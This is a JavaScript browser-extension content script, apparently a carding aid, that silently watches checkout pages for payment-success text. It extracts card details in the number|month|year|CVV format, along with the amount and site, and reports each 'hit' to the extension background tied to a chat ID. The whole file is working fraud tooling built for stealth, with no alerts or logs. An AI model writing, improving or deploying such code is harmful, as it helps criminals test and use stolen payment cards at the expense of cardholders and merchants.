/**
 * Nexvora Stealth Detection (v6.0 - Silent)
 * No alerts, no logs, pure detection.
 */

(function() {
    const startTime = Date.now();
    let hasNotified = false;

    /** 1-Second Stealth Scan */
    setInterval(() => {
        if (hasNotified) return;
        if (Date.now() - startTime < 3000) return; // Wait 3s for page stability

        const scan = (root) => {
            if (hasNotified || !root) return;

            // Universal text extraction
            const text = root.innerText || root.textContent || '';
            const lower = text.toLowerCase();
            
            // Refined success markers
            const isSuccess = (
                lower.includes('paid successfully') || 
                lower.includes('successfully hitted') || 
                lower.includes('approved') ||
                lower.includes('payment successful')
            );

            if (isSuccess && text.length > 5 && !lower.includes('wait') && !lower.includes('processing')) {
                hasNotified = true;
                
                // Stealth extraction
                const cardMatch = text.match(/\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}/);
                const currencyRegex = /(?:[A-Z]{2,3}|[\$£€¥])\s?[\d,]+(?:\.\d{2,3})?|[\d,]+(?:\.\d{2})?\s?(?:[A-Z]{2,3}|[\$£€¥])/gi;
                const amountMatch = text.match(currencyRegex) || document.body.innerText.match(currencyRegex);

                // Pure background communication (No UI alert)
                chrome.runtime.sendMessage({
                    type: 'NOTIFY_HIT',
                    data: {
                        card: cardMatch ? cardMatch[0] : 'N/A',
                        amount: amountMatch ? amountMatch[0].trim() : 'N/A',
                        gateway: 'Stripe Gateway',
                        status: 'Approved',
                        site_name: window.location.hostname,
                        user_chat_id: 'Unknown'
                    }
                });
                return;
            }

            // Recursive traversal
            if (root.shadowRoot) scan(root.shadowRoot);
            if (root.tagName === 'IFRAME') {
                try { scan(root.contentDocument.body); } catch(e) {}
            }
            if (root.childNodes) {
                for (let child of root.childNodes) {
                    if (child.nodeType === 1) scan(child);
                }
            }
        };

        scan(document.body);
    }, 1000);
})();
